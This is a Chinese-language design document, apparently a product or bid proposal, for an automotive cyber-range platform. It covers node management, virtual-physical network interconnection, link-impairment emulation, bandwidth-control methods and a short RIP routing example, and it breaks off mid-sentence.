alt="1703491695987"></p><p>200人的http接入日志</p><p>目标网络管理模块的业务处理流程如下：用户通过Web登录系统，根据需要选取PC、交换机和路由器等网络设备，搭建并设计网络拓扑图；把网络图提交到Web服务器，Web服务器接收到用户的请求之后，分析网络拓扑图，定制用户所需要的网络实验环境(包括虚拟PC、虚拟交换机和虚拟路由器的建立、网络参数的配置、网卡的配置等)，执行接口适配模块提供的指令发送到宿主机；宿主机接收到命令后执行命令，建立用户所需的网络实验环境，并返回虚拟机的IP地址和端口等参数，用户通过Web的方式登录这些虚拟机，进行真实的网络实验。</p><p>网络拓扑设计控制流程</p><p>在用户通过Web界面设计好网络拓扑图之后，服务器会生成对应的虚拟机资源。Web服务器除了提供Web服务功能外，远程桌面、资源管理器和性能监控都运行在Web服务器上，资源管理器和性能监控通过Web Service和虚拟机管理程序建立连接并发送指令对虚拟机进行管理和监控。虚拟机管理程序可以是vCenter Server、Xen Server、KVM等。虚拟机管理程序是Hypervisor，它是集成在基础资源云平台中的，可以直接对硬件进行调度管理。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/31df8d107ee8210b98bebd3f0dd98ac7.png"></p><p>虚拟网络仿真构建子系统架构</p><p>我们为部署的目标网络提供了全面的管理和控制功能,包括虚拟节点的启动、停止、重启、密码设置、重建和端口转发等。同时支持节点迁移和运行状态监控,如节点启停状态和资源利用情况。目标网络具有场景锁定功能,可在试验开始后防止拓扑结构和参数被修改,并支持自动锁定。我们还提供了网络拓扑的动态校验功能,可根据场景需要自动或手动校验IP、端口的联通性。虚拟化节点、容器节点和物理节点可通过无差异的Web页面操作接入,支持SSH、RDP 和VNC等多种协议,并可上传下载文件,操作支持录屏。</p><p>功能参数设计方面，系统提供了全面的管理和控制功能，以确保目标网络的有效运营。具体功能包括虚拟节点的启动、停止、重启、设置密码、重建、端口转发等管理操作，用户可以根据需要对虚拟节点进行灵活的管理和配置。此外，系统还支持虚拟节点的迁移功能，并监控虚拟节点的运行状态，包括节点的启停状态和资源利用情况，这有助于用户根据实际需求进行虚拟节点的迁移操作，以确保系统的平稳运行。为了保障目标网络场景的稳定性，系统提供场景锁定功能，防止在试验开始后对场景内的拓扑结构和参数进行修改。同时，竞赛和演练开始后，系统还支持自动锁定场景，以确保操作的稳定性和一致性。系统还具备对部署后的网络拓扑进行动态校验的功能，包括校验IP和端口的联通性。用户可以选择自动检验或进行人工配置校验，以确保网络的正常运行。为了方便用户操作目标网络，系统提供了虚拟化节点、容器节点和实物节点的无差异Web接入操作。用户可以选择SSH、RDP和VNC等远程协议类型的接入方式，同时支持文件上传和下载操作，并记录操作过程以供回顾。</p><p>性能参数设计方面，系统支持管理和控制最多1400个节点，以满足大规模网络管理的需求。具备100虚拟节点的批量管理能力，包括批量启动、关机、重启、修改密码和销毁等操作。用户可以选择随机或指定模式进行批量修改密码，从而提高了管理的效率。系统能够同时支持200人的接入操作，并具备扩展性，以满足更多用户接入的需求。这确保了多用户同时管理和操作目标网络的顺畅性。这些性能参数的设计充分考虑了系统在大规模网络管理和操作中的高效性和可扩展性，以满足复杂网络环境下的需求。</p><p>设计一个全面的目标网络管理和控制系统，用于监控、管理和维护虚拟化节点、容器节点和实物节点。系统应提供节点迁移、网络场景锁定、动态校验等功能，并支持不同远程协议的Web接入操作。</p><ol><li>网络管理控制系统设计：</li></ol><p>节点管理功能：实现节点管理模块，提供启动、停止、重启、设置密码、重建、端口转发等功能。</p><p>状态监控与迁移：设计节点监控模块，实时监控节点运行状态和资源利用情况，并提供迁移功能。</p><p>场景锁定机制：开发场景锁定功能，确保试验或演练开始后场景不被修改。</p><p>拓扑动态校验：实现拓扑校验工具，支持IP和端口连通性的自动和手动校验。</p><ol><li>Web接入操作</li></ol><p>无差异接入：提供统一的Web接入平台，支持SSH、RDP、VNC等远程协议。</p><p>文件管理：允许用户通过Web接入平台上传和下载文件。</p><p>操作录屏：集成录屏功能，记录操作过程。</p><ol><li>性能参数满足</li></ol><p>节点管理能力：确保系统支持不低于1400个节点的管理。</p><p>批量管理功能：支持不低于100个虚拟节点的批量管理，包括启动、关机、重启、修改密码和销毁操作。</p><p>多用户接入能力：保证系统支持同时不低于200人接入操作，并支持扩展。</p><ol><li>需求分析与规划</li></ol><p>分析网络管理和控制的需求。</p><p>规划系统架构和功能模块。</p><ol><li>系统开发</li></ol><p>开发网络管理控制模块，实现节点的基本操作功能。</p><p>实现节点状态监控与迁移功能。</p><p>设计并实现场景锁定机制。</p><p>开发拓扑动态校验工具。</p><ol><li>Web接入平台</li></ol><p>设计并实现无差异Web接入操作平台。</p><p>集成文件管理和操作录屏功能。</p><ol><li>测试与优化</li></ol><p>进行单元测试、集成测试和性能测试。</p><p>根据测试结果优化系统性能。</p><ol><li>部署与监控</li></ol><p>在实际环境中部署系统。</p><p>监控系统运行情况，确保性能参数满足要求。</p><ol><li>技术选型</li></ol><p>前端框架：使用如React或Vue.js等现代前端框架。</p><p>后端框架：使用如Spring Boot或Django等高效的后端框架。</p><p>虚拟化技术：使用KVM、Docker等成熟的虚拟化技术。</p><p>网络管理：使用OpenStack、Kubernetes等云管理平台。</p><p>远程协议支持：集成Guacamole或其他远程桌面网关解决方案。</p><ol><li>预期结果</li></ol><p>成功实现一个能够高效管理超过1400个节点的网络管理和控制系统。</p><p>实现对网络场景的稳定锁定和动态校验，确保试验和演练的准确性。</p><p>提供无差异的Web接入操作，满足多协议支持和多用户接入的需求。</p><h2 id="虚实互联管理模块"><a href="#虚实互联管理模块" class="headerlink" title="虚实互联管理模块"></a>虚实互联管理模块</h2><ul><li>支持为目标网络配置公网IP,或者将目标网络的指定IP、端口映射到公网IP的端口，让指定网络能直接访问目标网络，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/aca65bfd8b801defa386f81462d89ee6.png"></p><p>IP配置</p><p>功能参数设计方面，系统具备广泛的物理网络接入能力，能够支持实车、车载零部件、测试工具、物理主机、安全设备、网络设备、车载以太网、CAN、LIN等各种物理网络接入方式，并将其连接到由网络靶场平台生成的虚拟网络中，形成虚实结合的目标网络。此外，系统还支持有线透明设备（如IPS等）的透明接入到虚拟网络，可以透明地串联实物设备和虚拟设备之间，同时不改变透明设备的属性。系统还能够支持异地设备的接入，使其与虚拟网络中的虚拟机和容器在同一编址空间内运行，无论是本地接入设备还是异地接入设备，都能够享受相同的管理和接入特性。此外，系统支持异域网络通过路由器或防火墙作为接入点接入到虚拟网络中，并能够配置专用虚拟设备接入到平台配置的公共网络，支持公共网络的配置和管理，包括路由、VPN、防火墙等功能，单个虚拟设备支持最多20个VPN链路。系统还支持为目标网络配置不同的场景，如车云通信、车内以太网等，并指定子网访问公共网络资源，同时还支持配置虚拟VPN，允许公共网络用户通过VPN连接方式接入目标网络，并管理公网IP地址池，可为不同试验环境配置不同的公网IP地址池，支持公网IP地址池的管理。</p><p>性能参数设计方面，系统能够支持100个实物设备同时接入，并可以根据实际情况通过扩展虚拟互联交换机的方式进行扩展，以适应大规模网络接入需求。虚实互联交换机支持通用三层交换机，如华为、华三等，无需特殊功能，使系统更加灵活和可扩展。此外，系统能够管理120个公网IP地址，确保公网资源的充分利用和管理。这些性能参数的设计旨在满足复杂网络环境下的高效运行和可扩展性需求。</p><p>虚实互联管理模块将实物设备（零部件、测试工具、实车、物理主机、网络设备、安全设备等）或物理网络与靶场基础平台生成的虚拟网络互联，组成统一的汽车目标网络。实物设备通过虚拟互联交换机与靶场基础平台相连。</p><p>功能包含但不限于设备部署、设备管理、列表展示、设备增删改查；对部署成功的设备将展示在列表中，设备管理中对部署好的拓扑中的虚拟设备、实物设备和路由设备进行管理。如为已经部署的虚拟机安装软件或者上传文件，查看实物设备的名称、IP信息，为路由设备进行路由器设置，下发路由配置等操作。</p><p>虚实互联管理模块的功能主要是将虚拟网络环境中无法通过虚拟网络设备提供的服务，通过接入物理设备来实现与虚拟网络的统一融合，以利用物理设备提供的服务并实现服务的可扩展接入。虚实结合的功能模块主要实现两个方面的功能。</p><p>首先，该模块需要定制能够接入的物理设备的类型。物理设备包括防火墙、交换机、路由器、服务器等各种类型，每种设备都有不同的接入方式。因此，该模块需要兼容各种设备的统一接入，以确保与各种物理设备的无缝连接。</p><p>其次，该模块支持物理设备的可视化配置。不同类型的物理设备具有不同的配置内容和配置方式，无法实现配置项的自动化。因此，该系统提供统一的配置界面，以便用户能够方便地对实体网络设备进行配置。通过可视化配置界面，用户可以进行设备的参数设置、网络拓扑配置等操作，从而实现对物理设备的灵活配置和管理。</p><p>总结而言，虚实互联管理模块的功能是将虚拟网络与物理设备进行统一融合，通过采用虚实互通接口及时钟同步技术，虚拟节点与实体节点能够实现互联。这样可以将虚拟网络与物理网络融为一体，形成既具备统一拓扑架构又维持一致逻辑视图的综合网络环境。</p><p>将虚拟网络与现实的物理网络相连是一项技术手段，它允许虚拟机与实体网络设备之间建立连接和交流。利用这种技术，可以实现虚拟和物理网络的无缝对接，构建出一个既有统一的网络布局也有整齐的逻辑视图的网络系统。系统兼容多样的真实物理网络设备，包括计算机、路由器、交换机、服务器以及各类安全防护装置，满足不同网络组件接入的需求。这种接入支持能让用户将实际的硬件资源集成到网络环境中，以进行全面的测试和模拟。支持实物设备透明接入。支持系统管理员将实物设备注册到场景导调系统，并支持分配给设计人员使用，实物设备互联接入虚拟网络支持与现有SDN控制器对接实现。支持将透明设备接入到目标SDN网络中，并且不能改变设备的透明属性。</p><p>半实物仿真系统由虚实网络配置解析、虚拟节点实物节点互联模块组成：</p><p>1. 虚实网络配置解析：通过提取虚拟节点与实体设备的连接关系、配置信息关系等信息得出完整的网络拓扑。</p><p>2. 虚拟节点和实物节点互联：通过网络虚拟化技术提供虚拟节点的仿真实现，运用虚实转化接口和时钟同步机制可以使虚实节点互联互通。系统能够把虚拟网络和实体网络设备无缝集成，创建出一个统一的网络拓扑结构，同时提供一个整合的逻辑视图，形成一个完整的目标网络环境。这样的设计使得网络规划和管理变得更为直观，有助于用户理解和监控整个网络架构的运行状态。</p><p>半物理仿真系统能够处理来自虚拟节点的部署数据和虚拟与现实联动信息，通过其网络配置分析模块来解读这些配置，并利用虚拟与实体联接模块创建虚拟与实体设备之间的网络连接。</p><p>虚实互联模块封装了BGP协议相关的接口，它通过和虚实网络构建子系统中的SDN控制器的控制模块进行通讯，实物接入子系统使用BGP协议和边界路由器交换路由，并使用netconf协议给边界路由器发送配置状态。</p><p>NETCONF基于XML的网络配置协议，NETCONF协议采用了分层结构，每个层分别对协议的某一个方面进行包装，并向上层提供相关的服务。分层结构能让每个层只关注协议的一个方面，实现起来更加简单，同时合理的解耦各个层之间的依赖，可以将各层内部实现机制的变更对其它层的影响降低到最低。</p><p>边界路由器采用VXLAN封装技术，它能够桥接基于软件的网络覆盖层和底层物理基础设施之间的网络服务。VXLAN是最简单的桥接传统网络到虚拟化的部署方式，使传统网络完全过渡到完全虚拟化的网络。物理硬件中部署的 VXLAN将“优化和控制”网络虚拟化，最终将虚拟网络和物理网络融合在一起，正如OpenFlow和传统2、3层网络一样。VXLAN能使工作负载从一个路由网络移动到另一个，或者从一个子网转移到另一个，同时保留IP地址。并且，它允许网络进行扩展。因此，外界设备计入到虚拟网络中，只需要配置物理设备的IP到具体网络间的映射，并将规则配置懂啊边界路由器内，由边界路由器维护配置的转发规则，就可以连通虚拟网络和物理网络或者某个设备。</p><p>我们的系统具备各项功能，能够轻松将IPS等有线透明设备无缝集成进虚拟网络中。透过串联实物设备，实现虚拟与实体设备的互联，且不会影响透明设备的特性，保持其不可见性。实物设备可与虚拟机和容器在同一网络地址空间中运行，共享IP地址范围，确保无缝通讯。系统还支持远程设备接入，可经由路由器或防火墙加入虚拟网络，享受与本地设备同等的管理与接入。系统提供了配置访问公网资源的选项，包括指定的子网、公网IP池和端口映射功能，增强了网络管理的灵活性和跨网络操作的能力。</p><p>支持通过在拓扑中配置专用设备接入到平台配置的公共网络的功能。这些专用设备可以通过用户指定的网络或互联网进行接入，并直接在设备上配置公网IP。我们的系统也允许在专用设备上进行路由、VPN和防火墙等功能的配置，以增强网络安全性和扩展连接能力。同时，我们支持配置虚拟VPN，让公共网络用户通过连接虚拟VPN的方式安全地接入到目标网络中。我们的系统可以提供一个图形化界面，以方便用户在拓扑中配置专用设备接入到公共网络，并支持必要的网络功能配置。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/f68b44aa45dded98315899a0c2fa39d8.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/4a67304a1a9b92144ddcc5b64caf150b.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ff3580ec83eb74e4f7f84b33cabd7d94.png"></p><p>实物网络虚拟节点映射</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/22fa38cee4de44657edfa2feda88497d.png"></p><p>VPN接入</p><ol><li>虚实网络接入架构：</li></ol><p>虚实互联：实现虚实资源互联的接入架构，保证实物设备和虚拟网络的无缝融合。</p><p>透明设备接入：设计透明接入模块，使IPS等有线透明设备能够无缝接入虚拟网络。</p><p>同一编址空间：确保实物设备与虚拟网络中的虚拟机和容器处于同一编址空间。</p><ol><li>异地设备接入</li></ol><p>异地接入无差别：提供异地设备接入解决方案，确保异地接入设备与本地设备管理和操作上无差别。</p><p>异域网络接入：支持异域网络通过路由器或防火墙接入到虚拟网络中。</p><ol><li>网络功能配置：</li></ol><p>公共网络接入：允许虚拟设备接入到指定的公共网络或互联网，并配置网络功能。</p><p>场景化网络配置：支持配置特定场景的目标网络，如车云通信、车内以太网等。</p><p>公网IP管理：实现公网IP配置和管理模块，支持公网IP地址池的管理。</p><ol><li>性能数满足：</li></ol><p>实物设备接入能力：确保系统支持不少于100个实物设备的接入。</p><p>公网IP管理能力：确保系统能够管理不少于120个公网IP。</p><p>实施步骤</p><ol><li>需求分析与规划：</li></ol><p>分析虚实结合网络接入和管理的需求。</p><p>规划系统架构和功能模块。</p><ol><li>系统开发：</li></ol><p>开发虚实网络接入模块。</p><p>实现透明设备接入功能。</p><p>设计异地设备接入方案。</p><p>开发网络功能配置模块。</p><ol><li>测试与优化：</li></ol><p>进行单元测试、集成测试和性能测试。</p><p>根据测试结果优化系统性能。</p><ol><li>部署与监控：</li></ol><p>在实际环境中部署系统。</p><p>监控系统运行情况，确保性能参数满足要求。</p><ol><li>技术选型</li></ol><p>网络虚拟化：使用Open vSwitch、VMware NSX等网络虚拟化技术。</p><p>远程接入：采用VPN、SD-WAN等技术实现异地设备的安全接入。</p><p>IP地址管理：使用IPAM解决方案进行公网IP地址池的管理。</p><p>网络设备支持：确保系统兼容通用三层交换机如华为、华三等品牌。</p><ol><li>预期结果</li></ol><p>成功实现一个高效、可靠的虚实结合网络接入和管理系统。</p><p>满足包括异地设备在内的实物设备与虚拟网络的无缝接入和管理。</p><p>提供灵活的网络功能配置，支持场景化网络和公网IP的管理。</p><h2 id="虚拟网络支撑模块"><a href="#虚拟网络支撑模块" class="headerlink" title="虚拟网络支撑模块"></a>虚拟网络支撑模块</h2><ul><li>支持通过配套的windows App或者安卓App录制网络的上下行带宽、延迟、丢包率变化过程，生成txt回放文件。每条虚拟链路都支持导入txt回放文件进行上下行带宽、延迟、丢包率变化过程的回放，回放进度可通过进度条调节，回放过程可通过曲线图观察，提供产品功能截图证明。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/7e9176f802c83bd77d4ae51fa16f3b75.png"></p><p>流量回放控制</p><p>虚拟网络支撑模块可以建立起虚拟节点之间的通信链路,从而实现整个虚拟网络拓扑的自动化配置和快速重构。通过仿真网络中的带宽、延迟等参数,可以定制出特定的网络环境。这为测试人员提供了高度灵活性,使其能够根据测试需求快速搭建不同的虚拟网络拓扑结构和参数,大大提升测试效率。</p><p>功能参数设计方面，平台具备丰富的网络仿真功能。它采用2U标准网络机箱，拥有1个10/100/1000Base-T管理网口以及6个万兆SFP＋业务网口，这些网口组成了三组万兆物理仿真引擎。平台提供了Web图形化控制界面，用户可以通过该界面进行各种网络仿真设置和控制。</p><p>每个仿真引擎可以创建15条独立的双向虚拟链路，整机三个引擎一共可以创建45条虚拟链路，每条虚拟链路的损伤参数可以独立配置。此外，每个网口支持45个报文过滤规则，单个仿真引擎每个方向的报文处理性能为1500000pps。平台还支持带宽抖动控制、队列深度功能以及MTU功能，可以实现流量整形和各种网络仿真需求。它还支持各种报文损伤模式，包括时延抖动、随机丢包、周期性丢包、报文乱序、重复报文、报文任意字段篡改等。平台内置网络损伤抓包分析功能，支持对指定的物理链路或虚拟链路进行抓包分析，以便日后的故障排查和分析。</p><p>性能参数设计方面，平台支持多项控制和配置，包括带宽控制、报文乱序控制、重复报文控制、丢包范围控制、构造时延范围控制、隔离网络的构建以及虚拟端口的构建。它具备出色的带宽控制范围，支持从0到10000Mbps的控制，最小控制颗粒度为1bps。此外，它还支持对乱序、重复报文和丢包的高精度控制，以及时延范围的设置。平台可以构建1000个隔离网络和5000个虚拟端口，满足不同仿真场景的需求。这些性能参数确保了平台在网络仿真和测试方面的高度可配置性和精确度。</p><p>1. 系统概述</p><p>本方案旨在设计一款车载网络仿真与管理系统，该系统将使用2U标准网络机箱，集成高性能的网络仿真引擎，提供丰富的网络损伤模拟、分析和管理功能。系统的设计满足车载网络环境的测试、评估及研发需求。系统将内置天津、北京、上海、重庆、成都、杭州、南京、福州、济南、广州、合肥、沈阳、西安等中国主要城市之间的网络环境配置模板。这些模板将模拟包括2G、3G、4G、WiFi在内的各种网络环境，以及这些城市与中国其它32地（包括23个省、5个自治区、4个直辖市）客户端之间的网络通信特性。</p><p>2. 硬件配置</p><p>机箱规格：2U标准网络机箱，适合各种机架安装环境。</p><p>管理网口：1个10/100/1000Base-T网口，用于系统管理和控制。</p><p>业务网口：6个万兆SFP+端口，分为三组，每组提供两个端口，组成物理仿真引擎。</p><p>3. 仿真引擎</p><p>虚拟链路：每个仿真引擎可创建至少15条双向虚拟链路，合计至少45条。</p><p>报文处理性能：每个仿真引擎每个方向的报文处理能力为1500000pps。</p><p>报文过滤规则：每个网口支持至少45个报文过滤规则。</p><p>4. 软件功能</p><p>控制界面：Web图形化界面，用于控制和监控系统状态。</p><p>网络损伤模拟：支持带宽抖动、队列深度调节、MTU设置、时延构造等多种仿真。</p><p>损伤抓包分析：内置分析工具，可对物理及虚拟链路进行抓包分析，记录延迟、丢包、误码等数据。</p><p>报文分类处理：支持基于IPv4/IPv6地址、MAC地址、VLAN、MPLS标签、TCP/UDP端口等的报文分类处理。</p><p>持久性与可视化：配置信息可存储于设备内部，断电后可恢复；提供实时数据统计和曲线图。</p><p>5. 网络环境模板</p><p>预设模板：内置主要城市之间的2G、3G、4G、Wifi网络环境配置模板。</p><p>6. 回放功能</p><p>网络状态回放：支持通过Windows或Android App录制网络状态，并生成txt回放文件。</p><p>7. API支持</p><p>API接口：提供restfulAPI 和Python API，支持高频率的参数调整。</p><p>8. 路由器仿真</p><p>仿真协议：支持RIP、OSPF、BGP、MPLS等协议，以及IPsec、OpenVPN、VXLAN等技术。</p><p>9. 数据交换与网络隔离</p><p>网络构建：模块提供数据交换和网络隔离功能，支持DHCP服务和手动指定MAC/IP。</p><p>10. 产品信息</p><p>品牌型号：提供产品品牌、型号、数量及详细的性能参数信息。</p><p>11. 性能参数</p><p>带宽控制：范围0到10000Mbps，颗粒度1bps。</p><p>报文乱序：控制颗粒度0.001％。</p><p>重复报文：控制颗粒度0.001％。</p><p>丢包控制：范围0%到100%，颗粒度0.0001％。</p><p>时延构造：范围0到10秒，颗粒度0.1ms。</p><p>网络隔离：支持构建不低于1000个隔离网络。</p><p>虚拟端口：支持构建不低于5000个虚拟端口。</p><p>12. 实施步骤</p><p>硬件采购与组装：</p><p>精选符合性能需求的硬件组件。</p><p>完成网络机箱的组装和配置。</p><p>软件开发与集成：</p><p>开发Web控制界面和后端仿真逻辑。</p><p>集成所有软件功能，确保系统稳定运行。</p><p>系统测试：</p><p>对每项功能进行严格测试，确保性能符合要求。</p><p>对系统进行压力测试，验证稳定性和可靠性。</p><p>部署与培训：</p><p>在实际环境中部署系统。</p><p>对用户进行详细的操作培训。</p><p>维护与升级：</p><p>提供持续的技术支持和定期的系统升级。</p><p>13. 技术选型</p><p>仿真技术：采用先进的网络仿真技术模拟真实网络环境。</p><p>前端技术：使用现代Web技术栈，如React或Vue.js，构建用户界面。</p><p>后端技术：利用高性能的后端框架，如Node.js或Python Flask，提供稳定的API服务。</p><p>14. 预期结果</p><p>实现一款功能全面、性能优越的车载网络仿真与管理系统。</p><p>提供真实、准确的网络环境仿真，适用于广泛的测试和评估场景。</p><p>系统操作简便，支持多种网络环境的快速配置和管理。</p><h4 id="带宽控制"><a href="#带宽控制" class="headerlink" title="带宽控制"></a>带宽控制</h4><ol><li>带宽控制原理</li></ol><p>1. 基于流的带宽控制</p><p>基于流的带宽控制是根据流的标识符来控制流量的传输速率。流的标识符可以是源地址、目的地址、端口号、协议类型等。基于流的带宽控制可以实现细粒度的带宽控制，可以根据不同的流类型或不同的应用程序来分配不同的带宽。</p><p>基于流的带宽控制算法可以分为以下几种类型：</p><ul><li>令牌桶算法：令牌桶算法是基于令牌桶的简单但有效的带宽控制算法。令牌桶算法会定期向桶中放入令牌，流量只能在令牌桶中还有令牌时才能发送。</li><li>窗口算法：窗口算法是基于窗口的带宽控制算法。窗口算法会维护一个窗口，窗口大小代表了当前可用的带宽。流量只能在窗口中还有空间时才能发送。</li><li>拥塞控制算法：拥塞控制算法是用于控制网络拥塞的带宽控制算法。拥塞控制算法会根据网络的拥塞情况来调整流量的传输速率。</li></ul><p>2. 基于端口的带宽控制</p><p>基于端口的带宽控制是根据端口号来控制流量的传输速率。端口号是应用程序使用的标识符，不同的应用程序通常使用不同的端口号。基于端口的带宽控制可以实现简单的带宽控制，可以根据不同的应用程序来分配不同的带宽。</p><p>基于端口的带宽控制算法可以分为以下几种类型：</p><ul><li>固定带宽控制：固定带宽控制是将每个端口的带宽固定为一个值。</li><li>动态带宽控制：动态带宽控制会根据网络的负载情况来调整每个端口的带宽。</li></ul><p>3. 基于路由的带宽控制</p><p>基于路由的带宽控制是根据路由表来控制流量的传输速率。路由表中记录了网络中的路由信息，包括路由的源地址、目的地址、下一跳地址和带宽。基于路由的带宽控制可以实现灵活的带宽控制，可以根据不同的路由来分配不同的带宽。</p><p>基于路由的带宽控制算法可以分为以下几种类型：</p><ul><li>基于路由表的带宽控制：基于路由表的带宽控制是直接使用路由表中的带宽信息来控制流量的传输速率。</li><li>基于路径的带宽控制：基于路径的带宽控制会根据流量的路径来计算流量的传输速率。</li></ul><p>通过精确控制带宽，网络专业人员可以更好地评估应用程序、设备或系统在不同网络环境下的性能表现，并进行有效的性能优化、安全测试和攻防演练。这些方法和工具可以在网络靶场中组合使用，以便根据需要模拟各种网络条件。</p><p>以下是网络靶场内基于虚拟网络NFV的带宽控制算法：</p><p>令牌桶算法：令牌桶算法是一种常见的带宽控制方法，它基于令牌桶的概念来限制数据包的传输速率。虚拟网络中可以配置令牌桶算法，以确保网络流量不超出所分配的带宽。</p><p>Leaky Bucket（漏桶）算法：漏桶算法是另一种流量调整工具，它模拟了一个有限容量的桶，数据包以固定速率从桶中流出。当桶满了，多余的数据包将被丢弃。</p><p>流量整形（Traffic Shaping）：流量整形是一种广泛使用的带宽控制方法，它通过调整传输速率、缓冲区大小和延迟等参数，来限制数据流的速率。用于模拟不同的带宽条件。</p><p>Quality of Service（QoS）：QoS 是一种网络管理技术，用于为不同类型的流量分配不同的优先级和带宽。在虚拟网络中，QoS 可以用于确保关键应用程序的带宽需求得到满足。</p><p>网络虚拟化技术：通过使用网络虚拟化技术，可以为不同的虚拟网络划分独立的带宽资源。这允许在同一物理网络上运行多个虚拟网络，并为它们分配不同的带宽。</p><p>流量限制策略：通过配置流量限制策略，可以为特定的虚拟机、子网或应用程序限制带宽使用。这对于控制网络资源的分配非常有用。</p><p>负载均衡：负载均衡技术可以帮助分散网络流量，从而避免某些节点或链路过载。通过动态调整流量分布，可以有效地管理带宽利用率。</p><p>流量监控和分析：网络靶场通常还会使用流量监控和分析工具来实时监测网络流量，以便及时识别和解决带宽问题。</p><ol><li>常见带宽控制工具</li></ol><p>网络靶场内，基于linux的底层操作系统模拟带宽控制使用以下三种开源的命令工具，网络靶场内内嵌带宽控制脚本，在需要调用的虚拟机镜像设置。tc（Traffic Control）：tc 是 Linux 操作系统中的一个命令行工具，用于配置和管理网络带宽、延迟、丢包等参数。它支持各种队列管理算法，如 Token Bucket、HFSC（Hierarchical Fair Service Curve）等，可用于模拟各种网络条件。NetEm：NetEm 是 Linux 内核中的一个模块，用于模拟网络延迟和丢包。它允许用户指定特定接口的延迟、带宽和丢包率等参数，从而模拟不同的网络情况。Wondershaper：Wondershaper 是一个用于 Linux 操作系统的简单的带宽控制脚本，它可以轻松地限制特定接口的带宽使用。</p><p>在网络靶场内带宽控制的应用场景</p><p>网络攻击可能会导致网络拥塞或资源耗尽，从而影响网络的性能和可用性。在网络靶场内，可以使用带宽控制来研究网络攻击的影响。可以使用基于流的带宽控制来模拟网络攻击对关键业务流量的影响。这样，可以让网络安全人员了解网络攻击对网络性能和可用性的影响，从而制定有效的防御措施。</p><p>以下是一些具体应用场景：</p><ul><li>模拟网络拥塞<ul><li>在网络靶场内，可以使用基于流的带宽控制来限制某些流类型或应用程序的带宽，从而模拟网络拥塞。例如，可以限制视频流的带宽，从而模拟视频会议时网络拥塞的情况。</li><li>在网络靶场内，可以使用基于路由的带宽控制来模拟网络拥塞。例如，可以增加网络路径的延迟，从而模拟网络拥塞的情况。</li></ul></li><li>研究网络攻击的影响<ul><li>在网络靶场内，可以使用基于流的带宽控制来模拟网络攻击对关键业务流量的影响。例如，可以限制数据库连接的带宽，从而模拟数据库攻击对网络性能的影响。</li><li>在网络靶场内，可以使用基于路由的带宽控制来模拟网络攻击对网络路径的影响。例如，可以增加网络路径的丢包率，从而模拟网络攻击对网络可用性的影响。</li></ul></li><li>进行网络安全培训<ul><li>在网络安全培训中，可以使用基于流的带宽控制来模拟网络攻击对网络安全的影响。例如，可以限制防火墙的带宽，从而模拟网络攻击对防火墙的绕过。</li><li>在网络安全培训中，可以使用基于路由的带宽控制来模拟网络攻击对网络安全的影响。例如，可以增加网络路径的延迟，从而模拟网络攻击对网络安全的影响。</li></ul></li></ul><p><strong>路由协议仿真</strong></p><p>路由协议的概念</p><p>路由协议是用于计算网络中路由器之间的路由表的协议。路由表中记录了网络中的路由信息，包括路由的源地址、目的地址、下一跳地址和带宽。</p><p>路由协议可以分为两类：</p><ul><li><p>距离向量协议：距离向量协议是基于距离向量的路由协议。距离向量协议中的路由表项包含了到目的地址的距离和下一跳地址。距离向量协议中的路由器会定期向相邻路由器发送路由更新信息。</p></li><li><p>链路状态协议：链路状态协议是基于链路状态的路由协议。链路状态协议中的路由表项包含了到目的地址的距离、下一跳地址和链路状态。链路状态协议中的路由器会周期性地发送链路状态信息。</p><p>虚拟网络支撑模块主要包括两部分，网络协议构建器和网络协议分析器。功能主要包括过滤规则设置，报文捕获，报文分析与统计，协议参数输入与报文构造，报文发送和协议配合工作过程分析等。支持多种网络协议服务模拟。</p><p>支持虚拟机和容器多网卡的仿真，支持对指定虚拟链路的详细特性进行配置，包括链路带宽、延迟和丢包率等，用于模拟相关区域的网络实际情况；支持路由器的仿真功能，路由器仿真具备真实路由系统，支持RIP、OSPF、BGP和MPLS，可支持配置多种VPN协议，如IPsec和OpenVPN。还支持VXLAN协议，并与实物路由器实现互联互通。除此之外，它还提供数据交换和网络隔离功能，可为构建的虚拟网络自动构建DHCP服务，为虚拟节点分配IP，并支持指定虚拟节点的MAC和IP。</p><p>协议报文参数编辑：协议报文参数编辑模块针对每一个协议提供参数的配置，用户可以按协议的格式和字节顺序来编辑输入协议的参数，后台逻辑完成数据格式和字节顺序的转换工作。</p><p>报文构造与发送：报文构造与发送模块根据用户输入编辑输入的协议参数，自动构造相应的协议报文，并将构造好的报文通过网络发送出去。系统支持的协议报文包括有：数据链路层的以太网帧和PPPOE帧；网络层的IP、ARP/PARP、ICMP等协议，传输层的TCP和UDP；以及常用的路由协议报文（RIP、OSPF、BGP等）。还可以处理IP和TCP等协议报文中的选项。</p></li></ul><p>VyOS 的路由协议支持</p><p>VyOS是一个基于Debian Linux的开源路由器和防火墙操作系统。它具有强大的网络功能，包括路由、VPN、防火墙、QoS等。VyOS支持多种路由协议，如BGP、OSPF、RIP等，这使得它成为模拟网络协议的理想选择。</p><p>以下是一个使用 VyOS 来模拟 RIP 协议的示例：</p><ol><li>在网络靶场中部署两个 VyOS 路由器，分别命名为 R1 和 R2。</li><li>在 R1 上配置 RIP 协议：</li></ol><p>router rip</p><p>network 192.168.1.0</p><p>network 192.168.2.0</p><ol><li>在 R2 上配置 RIP 协议：</li></ol><p>router rip</p><p>network 192.168.2.0</p><p>network 192.168.3.0</p><ol><li>使用 ping 命令来测试 R1 和 R2 之间的路由：</li></ol><p>ping 192.168.2.2</p><p>通过对 VyOS 